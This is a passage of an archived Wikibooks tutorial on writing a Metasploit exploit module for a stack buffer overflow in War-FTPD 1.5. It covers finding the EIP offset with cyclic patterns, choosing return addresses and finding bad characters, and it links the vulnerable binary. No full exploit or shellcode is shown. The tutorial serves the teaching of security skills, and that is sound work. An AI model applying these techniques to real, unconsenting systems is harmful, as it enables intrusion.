EIP is overwriten with our evil string (41414141 is the hexadecimal equivalent for AAAA)<br>
<br></p>
<p><br></p>
<h4><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=11" title="Edit section: Fine tuning">edit</a>]</span> <span class="mw-headline" id="Fine_tuning">Fine tuning</span></h4>
<h5><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=12" title="Edit section: Finding space available">edit</a>]</span> <span class="mw-headline" id="Finding_space_available">Finding space available</span></h5>
<p>We have to find the space available for our shellcode (payload).</p>
<p>The Metasploit Framework includes tools to help us.</p>
<p>First, we shut down our debugger.</p>
<p><br>
We use the pattern_create() function to generate a string of non-repeating alpha-numeric text string. We use this function by calling the following script: C:\Program Files\Metasploit\Framework3\msf3\tools\pattern_create.rb</p>
<p>From a DOS command line console, it gives:</p>
<pre>C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_create.rb
Usage: pattern_create.rb length [set a] [set b] [set c]
</pre>
<p><br></p>
<p><br>
We generate a string of 1000 characters and use it in our exploit to trigger the bug again:</p>
<pre>C:\Program Files\Metasploit\Framework3\framework\tools&gt;ruby pattern_create.rb 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A
f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9
Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak
6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9
Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As
6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A
v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9
Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B
d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9
Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh

</pre>
<p>In our PoC code, we replace this line:</p>
<pre>exploit          = 'A' * 1000
</pre>
<p>for:</p>
<pre>exploit          = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A
f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9
Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak
6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9
Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As
6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A
v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9
Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B
d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9
Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh'
</pre>
<p><br>
Then, we save our modified PoC code. We start the War-FTPD FTP server. We run our debugger and attach it to the War-FTPD process. We launch our exploit...</p>
<p>Ok, we can now see this in our debugger:</p>
<p><a href="http://en.wikibooks.org/wiki/File:Msf_book_warftpd_olly02.png" class="image"><img alt="Msf book warftpd olly02.png" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Msf_book_warftpd_olly02.png" width="638" height="274"></a></p>
<p><br></p>
<p>We see that EIP is now overwritten with the value "32714131".</p>
<p><br>
Then we use patternOffset to know the number of characters to send before hitting EIP. For this, we use the following script: C:\Program Files\Metasploit\Framework3\framework\tools\pattern_offset.rb</p>
<p>From a DOS command line console, it gives:</p>
<pre>C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_offset.rb
Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
Default length of buffer if none is inserted: 8192
This buffer is generated by pattern_create() in the Rex library automatically
</pre>
<p><br>
So, we now provide the parameters found before like this:</p>
<pre>C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_offset.rb 32714131 1000<br>
</pre>
<p>The result "485" is displayed. It means that we should have a space of 485 bytes to store our payload.</p>
<p><br>
We add this value in our PoC code: We modify this line:</p>
<pre>'Space'    =&gt; 1000,          #We actually don't know the correct value for this
</pre>
<p>for:</p>
<pre>'Space'    =&gt; 485,
</pre>
<p>In this way, when we will load our exploit in the Metasploit Framework (with the "use" command), it will automatically search and display the available payloads with a size lower than 485 (with the "show PAYLOADS" command).</p>
<h5><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=13" title="Edit section: Finding a return address">edit</a>]</span> <span class="mw-headline" id="Finding_a_return_address">Finding a return address</span></h5>
<p>We have now to find a reliable return address.<br>
The best way is to take a return address directly in our target. (in the vulnerable executable itself or in one of the DLLs it uses)<br>
It avoids problems with various versions of Windows and Service Packs, locales, hotfixes...<br>
It would make our exploit universal.<br>
But it is not always so easy.<br>
<br>
One way for this is to use the search in memory functionality of OllyDbg.<br>
<br>
And, once again, the Metasploit Framework includes tools to help us.<br>
<br>
We can use 'msfpescan' to search return addresses for an opcode:<br></p>
<pre>$ ./framework/msfpescan
Usage: ./framework/msfpescan [mode] &lt;options&gt; [targets]

Modes:
    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions
    -p, --poppopret                  Search for pop+pop+ret combinations
    -r, --regex [regex]              Search for regex match
    -a, --analyze-address [address]  Display the code at the specified address
    -b, --analyze-offset [offset]    Display the code at the specified offset
    -f, --fingerprint                Attempt to identify the packer/compiler

Options:
    -M, --memdump                    The targets are memdump.exe directories
    -A, --after [bytes]              Number of bytes to show after match (-a/-b)

    -B, --before [bytes]             Number of bytes to show before match (-a/-b
)
    -I, --image-base [address]       Specify an alternate ImageBase
    -h, --help                       Show this message
</pre>
<p><br>
We can also use the MSF Opcodes Database:<br>
<a href="http://metasploit.com/users/opcode/msfopcode.cgi" class="external free" rel="nofollow">http://metasploit.com/users/opcode/msfopcode.cgi</a><br>
Note that the Metasploit Framework includes a built-in client to use this database:<br>
<a href="http://www.metasploit.com/projects/Framework/msf3/msfopcode.html" class="external free" rel="nofollow">http://www.metasploit.com/projects/Framework/msf3/msfopcode.html</a><br>
<br>
We can also use another nice tool called eereap from eEye:<br>
<a href="http://research.eeye.com/html/tools/RT20060801-2.html" class="external free" rel="nofollow">http://research.eeye.com/html/tools/RT20060801-2.html</a><br>
<br>
We can also find some international return addresses here:<br>
<a href="https://www.securinfos.info/international-opcodes/index.php" class="external free" rel="nofollow">https://www.securinfos.info/international-opcodes/index.php</a></p>
<h5><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=14" title="Edit section: Dealing with badchars">edit</a>]</span> <span class="mw-headline" id="Dealing_with_badchars">Dealing with badchars</span></h5>
<p>We have now to find and prevent badchars.<br>
We should not include terminating null character in our shellcode as it would break out of the execution.<br>
<i>We have already done this with this in our exploit: 'BadChars' =&gt; "\x00"</i><br>
<br>
Additionally, a target application will often modify the data received before the application will work with the data.<br>
An example is an application that will change all characters to uppercase.<br>
As this will modify our shellcode, we have to deal with it.<br>
For this, the Metasploit Framework will encode our shellcode to obtain one without any specified badchars.<br>
We just have to specify the list of badchars in our exploit code.<br>
<br>
So, to find the badchars, we will send a string containing all the characters of the ASCII table, with both printable and non-printable ones.<br>
The string will look like this:<br></p>
<pre>"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e<br>\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d<br>\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c<br>\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b<br>\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a<br>\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9<br>\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8<br>\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7<br>\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
</pre>
<p><br>
@ We edit our exploit code and put the above string in it.<br>
Then, having our target application running and our debugger attached to its process; we relaunch our exploit.<br>
Under the debugger, after the access violation is triggered, we right click on the esp register and choose the option "follow in dump".<br>
We will now see our string and check what are the missing or modified characters at the end of the string.<br>
It is our first badchars. (note it)<br>
<br>
We remove it in our exploit code, and do it@ again...<br>
until we see all the characters sended in our debugger.<br>
<br>
Now we write, in the badchars section of our exploit, the characters found as badchars (removed or modified by the application).</p>
<h2><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=15" title="Edit section: References">edit</a>]</span> <span class="mw-headline" id="References">References</span></h2>
<p>[1] Free Windows Debuggers<br>
<a href="http://www.ollydbg.de/" class="external free" rel="nofollow">http://www.ollydbg.de/</a><br>
<a href="http://www.microsoft.com/whdc/devtools/debugging/default.mspx" class="external free" rel="nofollow">http://www.microsoft.com/whdc/devtools/debugging/default.mspx</a></p>
<p>[2] WarFTPD v1.5 download link <a href="https://www.securinfos.info/old_softwares_vulnerable/WarFTP165_vulnerable_USER_BufferOverflow.exe" class="external free" rel="nofollow">https://www.securinfos.info/old_softwares_vulnerable/WarFTP165_vulnerable_USER_BufferOverflow.exe</a></p>
<p><a href="http://www.milw0rm.com/papers/142" class="external free" rel="nofollow">http://www.milw0rm.com/papers/142</a><br>
<br>
Metasploit Framework v3.0 Developer Documentation:<br>
<a href="http://metasploit.com/projects/Framework/msf3/" class="external free" rel="nofollow">http://Metasploit.com/projects/Framework/msf3/</a><br>
<br>
Exploit Module Tutorial:<br>
<a href="http://metasploit.com/projects/Framework/documentation.html#exploitTutorial" class="external free" rel="nofollow">http://Metasploit.com/projects/Framework/documentation.html#exploitTutorial</a><br>
<br>
Vinnie Liu - Writing Exploits III:<br>
<a href="http://www.syngress.com/book_catalog/327_SSPC/sample.pdf" class="external free" rel="nofollow">http://www.syngress.com/book_catalog/327_SSPC/sample.pdf</a><br>
<br>
<a href="http://www.securityforest.com/wiki/index.php/Category:Buffer_Overflows_Education" class="external free" rel="nofollow">http://www.securityforest.com/wiki/index.php/Category:Buffer_Overflows_Education</a><br>
<a href="https://www.securinfos.info/english/security-papers-hacking-whitepapers.php" class="external free" rel="nofollow">https://www.securinfos.info/english/security-papers-hacking-whitepapers.php</a><br>
<br>
<a href="https://www.securinfos.info/VNSECON2007/VNSECON07-JA-Exploit_development.pdf" class="external free" rel="nofollow">https://www.securinfos.info/VNSECON2007/VNSECON07-JA-Exploit_development.pdf</a><br>
<br>
Developing My First Exploit - by MaXe (thanks to Jerome Athias)<br>
Video Guide: <a href="http://guides.intern0t.net/msf2.php" class="external free" rel="nofollow">http://guides.intern0t.net/msf2.php</a></p>


<!-- 
NewPP limit report
Preprocessor node count: 132/1000000
Post-expand include size: 521/2048000 bytes
Template argument size: 0/2048000 bytes
Expensive parser function count: 0/500
-->

<!-- Saved in parser cache with key enwikibooks:pcache:idhash:116389-0!*!0!default!!en!4 and timestamp 20110711084854 -->
<div class="printfooter">
Retrieved from "<a href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Metasploit WritingWindowsExploit - Wikibooks, open books for an open world.htm">http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id="catlinks" class="catlinks"><div id="mw-normal-catlinks"><a href="http://en.wikibooks.org/wiki/Special:Categories" title="Special:Categories">Category</a>: <span dir="ltr"><a href="http://en.wikibooks.org/wiki/Category:Metasploit" title="Category:Metasploit">Metasploit</a></span></div></div>				<!-- /catlinks -->
												<!-- dataAfterContent -->
				<div id="mw-data-after-content">
	<form method="post" action="http://en.wikibooks.org/w/index.php?title=Special:ReaderFeedback&action=submit" id="mw-feedbackform"><fieldset class="feedback_reviewform noprint"><legend><strong>What do you think of this page?</strong></legend>
<p><i>Please take a moment to rate this page below. Your feedback is valuable and helps us improve our website.</i>
</p><span id="mw-feedbackselects"><b><label for="wpreliability">Reliability</label>:</b>&nbsp;<select name="wpreliability" id="wpreliability" onchange="updateFeedbackForm()" class="rfb-rating-option--1"><option class="rfb-rating-option-4" value="4">Excellent</option>
<option class="rfb-rating-option-3" value="3">High</option>
<option class="rfb-rating-option-2" value="2">Fair</option>
<option class="rfb-rating-option-1" value="1">Low</option>
<option class="rfb-rating-option-0" value="0">Poor</option>
<option value="-1" selected="selected">(unsure)</option>
</select>
<b><label for="wpcompleteness">Completeness</label>:</b>&nbsp;<select name="wpcompleteness" id="wpcompleteness" onchange="updateFeedbackForm()" class="rfb-rating-option--1"><option class="rfb-rating-option-4" value="4">Excellent</option>
<option class="rfb-rating-option-3" value="3">High</option>
<option class="rfb-rating-option-2" value="2">Fair</option>
<option class="rfb-rating-option-1" value="1">Low</option>
<option class="rfb-rating-option-0" value="0">Poor</option>
<option value="-1" selected="selected">(unsure)</option>
</select>
<b><label for="wpnpov">Neutrality</label>:</b>&nbsp;<select name="wpnpov" id="wpnpov" onchange="updateFeedbackForm()" class="rfb-rating-option--1"><option class="rfb-rating-option-4" value="4">Excellent</option>
<option class="rfb-rating-option-3" value="3">High</option>
<option class="rfb-rating-option-2" value="2">Fair</option>
<option class="rfb-rating-option-1" value="1">Low</option>
<option class="rfb-rating-option-0" value="0">Poor</option>
<option value="-1" selected="selected">(unsure)</option>
</select>
<b><label for="wppresentation">Presentation</label>:</b>&nbsp;<select name="wppresentation" id="wppresentation" onchange="updateFeedbackForm()" class="rfb-rating-option--1"><option class="rfb-rating-option-4" value="4">Excellent</option>
<option class="rfb-rating-option-3" value="3">High</option>
<option class="rfb-rating-option-2" value="2">Fair</option>
<option class="rfb-rating-option-1" value="1">Low</option>
<option class="rfb-rating-option-0" value="0">Poor</option>
<option value="-1" selected="selected">(unsure)</option>
</select>
</span><input type="submit" value="Submit" id="submitfeedback" accesskey="b" title="Submit review [alt-b]" disabled=""><input type="hidden" value="Special:ReaderFeedback" name="title">
<input type="hidden" value="Metasploit/WritingWindowsExploit" name="target">
<input type="hidden" value="2095451" name="oldid">
<input type="hidden" value="4692f6f1b5cbc6a424c66ecd794b88d1" name="validatedParams"><input type="hidden" value="submit" name="action">
<input type="hidden" value="+\" name="wpEditToken">
<input name="commentary" size="12" value="" style="display:none;">
</fieldset></form>
</div>
				<!-- /dataAfterContent -->
								<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Personal tools</h5>
	<ul>
					<li id="pt-login"><a href="http://en.wikibooks.org/w/index.php?title=Special:UserLogin&returnto=Metasploit/WritingWindowsExploit" title="You are encouraged to log in; however, it is not mandatory [alt-o]" accesskey="o">Log in / create account</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Namespaces</h5>
	<ul>
					<li id="ca-nstab-main" class="selected"><span><a href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Metasploit WritingWindowsExploit - Wikibooks, open books for an open world.htm" title="View the content page [alt-c]" accesskey="c">Book</a></span></li>
					<li id="ca-talk"><span><a href="http://en.wikibooks.org/wiki/Talk:Metasploit/WritingWindowsExploit" title="Discussion about the content page [alt-t]" accesskey="t">Discussion</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Variants</span><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Views</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Metasploit WritingWindowsExploit - Wikibooks, open books for an open world.htm">Read</a></span></li>
					<li id="ca-edit"><span><a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit" title="You can edit this page. Please use the preview button before saving [alt-e]" accesskey="e">Edit</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=history" title="Past revisions of this page [alt-h]" accesskey="h">View history</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Actions</span><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
	<h5><label for="searchInput">Search</label></h5>
	<form action="http://en.wikibooks.org/w/index.php" id="searchform">
		<input type="hidden" name="title" value="Special:Search">
				<div id="simpleSearch">
						<input id="searchInput" name="search" type="text" title="Search Wikibooks [alt-f]" accesskey="f" value="" tabindex="1" placeholder="Search" autocomplete="off">
						<button id="searchButton" type="submit" name="button" title="Search the pages for this text"><img src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/search-ltr.png" alt="Search"></button>
					</div>
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint collapsible-nav">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(http://upload.wikimedia.org/wikibooks/en/b/bc/Wiki.png);" href="http://en.wikibooks.org/wiki/Main_Page" title="Visit the main page"></a></div>
				<!-- /logo -->
				
<!-- Navigation -->
<div class="portal first persistent" id="p-Navigation">
	<h5>Navigation</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage"><a href="http://en.wikibooks.org/wiki/Main_Page" title="Visit the main page [alt-z]" accesskey="z">Main Page</a></li>
					<li id="n-help"><a href="http://en.wikibooks.org/wiki/Help:Contents" title="Find help on how to use and edit Wikibooks">Help</a></li>
					<li id="n-Browse"><a href="http://en.wikibooks.org/wiki/Wikibooks:Card_Catalog_Office" title="Check out what Wikibooks has to offer">Browse</a></li>
					<li id="n-Cookbook"><a href="http://en.wikibooks.org/wiki/Cookbook:Table_of_Contents" title="Learn recipes from around the world">Cookbook</a></li>
					<li id="n-Wikijunior"><a href="http://en.wikibooks.org/wiki/Wikijunior" title="Books for children">Wikijunior</a></li>
					<li id="n-Featured-books"><a href="http://en.wikibooks.org/wiki/Wikibooks:Featured_books" title="The best of Wikibooks">Featured books</a></li>
					<li id="n-recentchanges"><a href="http://en.wikibooks.org/wiki/Special:RecentChanges" title="The list of recent changes in the wiki [alt-r]" accesskey="r">Recent changes</a></li>
					<li id="n-sitesupport"><a href="http://wikimediafoundation.org/wiki/Special:Landingcheck?landing_page=WMFJA085&language=en&utm_source=donate&utm_medium=sidebar&utm_campaign=20101204SB002" title="Support Wikibooks">Donations</a></li>
				<li id="n-randbook"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#" title="Show me a random book! [alt-x]" accesskey="x">Random book</a></li></ul>
			</div>
</div>

<!-- /Navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- Community -->
<div class="portal expanded" id="p-Community">
	<h5 tabindex="2">Community</h5>
	<div class="body" style="display: block; ">
				<ul>
					<li id="n-Reading-room"><a href="http://en.wikibooks.org/wiki/Wikibooks:Reading_room" title="Discuss Wikibooks-related questions and concerns with others">Reading room</a></li>
					<li id="n-portal"><a href="http://en.wikibooks.org/wiki/Wikibooks:Community_Portal" title="Find your way around the Wikibooks community">Community portal</a></li>
					<li id="n-currentevents"><a href="http://en.wikibooks.org/wiki/Wikibooks:Reading_room/Bulletin_Board" title="Important community news">Bulletin Board</a></li>
					<li id="n-maintenance"><a href="http://en.wikibooks.org/wiki/Wikibooks:Maintenance" title="Frequent tasks that you can help with">Help out!</a></li>
					<li id="n-Policies-and-guidelines"><a href="http://en.wikibooks.org/wiki/Wikibooks:Policies_and_guidelines" title="Pages detailing important rules and procedures">Policies and guidelines</a></li>
					<li id="n-contact"><a href="http://en.wikibooks.org/wiki/Wikibooks:Contact_us" title="Alternative methods of communication">Contact us</a></li>
				</ul>
			</div>
</div>

<!-- /Community -->

<!-- TOOLBOX -->
<div class="portal collapsed" id="p-tb">
	<h5 tabindex="3">Toolbox</h5>
	<div class="body">
		<ul><li id="google-trick-search"><a href="http://www.google.com/custom?sa=Google+Search&domains=en.wikibooks.org/wiki/Metasploit&sitesearch=en.wikibooks.org/wiki/Metasploit">Search this book</a></li>
					<li id="t-whatlinkshere"><a href="http://en.wikibooks.org/wiki/Special:WhatLinksHere/Metasploit/WritingWindowsExploit" title="List of all wiki pages that link here [alt-j]" accesskey="j">What links here</a></li>
						<li id="t-recentchangeslinked"><a href="http://en.wikibooks.org/wiki/Special:RecentChangesLinked/Metasploit/WritingWindowsExploit" title="Recent changes in pages linked from this page [alt-k]" accesskey="k">Related changes</a></li>
																																					<li id="t-upload"><a href="http://commons.wikimedia.org/wiki/Commons:Upload" title="Upload files [alt-u]" accesskey="u">Upload file</a></li>
											<li id="t-specialpages"><a href="http://en.wikibooks.org/wiki/Special:SpecialPages" title="List of all special pages [alt-q]" accesskey="q">Special pages</a></li>
											<li id="t-permalink"><a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&oldid=2095451" title="Permanent link to this revision of the page">Permanent link</a></li>
				<li id="t-rating"><a href="http://en.wikibooks.org/w/index.php?title=Special:RatingHistory&target=Metasploit/WritingWindowsExploit">Page rating</a></li>		</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->

<!-- Sister projects -->
<div class="portal collapsed" id="p-Sister_projects">
	<h5 tabindex="4">Sister projects</h5>
	<div class="body">
				<ul>
					<li id="n-Wikipedia"><a href="http://en.wikipedia.org/wiki/Main_Page">Wikipedia</a></li>
					<li id="n-Wikiversity"><a href="http://en.wikiversity.org/wiki/Wikiversity:Main_Page">Wikiversity</a></li>
					<li id="n-Wiktionary"><a href="http://en.wiktionary.org/wiki/Wiktionary:Main_Page">Wiktionary</a></li>
					<li id="n-Wikiquote"><a href="http://en.wikiquote.org/wiki/Main_Page">Wikiquote</a></li>
					<li id="n-Wikisource"><a href="http://en.wikisource.org/wiki/Main_Page">Wikisource</a></li>
					<li id="n-Wikinews"><a href="http://en.wikinews.org/wiki/Main_Page">Wikinews</a></li>
					<li id="n-Commons"><a href="http://commons.wikimedia.org/wiki/Main_Page">Commons</a></li>
				</ul>
			</div>
</div>

<!-- /Sister projects -->

<!-- coll-print_export -->
<div class="portal collapsed" id="p-coll-print_export">
	<h5 tabindex="5">Print/export</h5>
	<div class="body">
				<ul id="collectionPortletList"><li id="coll-create_a_book"><a href="http://en.wikibooks.org/w/index.php?title=Special:Book&bookcmd=book_creator&referer=Metasploit%2FWritingWindowsExploit" title="Create a book or page collection" rel="nofollow">Create a collection</a></li><li id="coll-download-as-rl"><a href="http://en.wikibooks.org/w/index.php?title=Special:Book&bookcmd=render_article&arttitle=Metasploit%2FWritingWindowsExploit&oldid=2095451&writer=rl" title="Download a PDF version of this wiki page" rel="nofollow">Download as PDF</a></li><li id="t-print"><a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&printable=yes" title="Printable version of this page [alt-p]" accesskey="p">Printable version</a></li></ul>			</div>
</div>

<!-- /coll-print_export -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
																	<li id="footer-info-lastmod"> This page was last modified on 13 May 2011, at 14:00.</li>
																							<li id="footer-info-copyright">Text is available under the <a rel="license" href="http://en.wikibooks.org/wiki/Wikibooks:Creative_Commons_Attribution-ShareAlike_3.0_Unported_License">Creative Commons Attribution-ShareAlike License</a><a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/" style="display:none;"></a>;
additional terms may apply. See <a href="http://wikimediafoundation.org/wiki/Terms_of_Use">Terms of Use</a> for details.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://wikimediafoundation.org/wiki/Privacy_policy" title="wikimedia:Privacy policy">Privacy policy</a></li>
																							<li id="footer-places-about"><a href="http://en.wikibooks.org/wiki/Wikibooks:Welcome" title="Wikibooks:Welcome">About Wikibooks</a></li>
																							<li id="footer-places-disclaimer"><a href="http://en.wikibooks.org/wiki/Wikibooks:General_disclaimer" title="Wikibooks:General disclaimer">Disclaimers</a></li>
																							<li id="footer-places-mobileview"><a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&useFormat=mobile">Mobile view</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://wikimediafoundation.org/"><img src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/wikimedia-button.png" width="88" height="31" alt="Wikimedia Foundation"></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31"></a>
					</li>
				</ul>
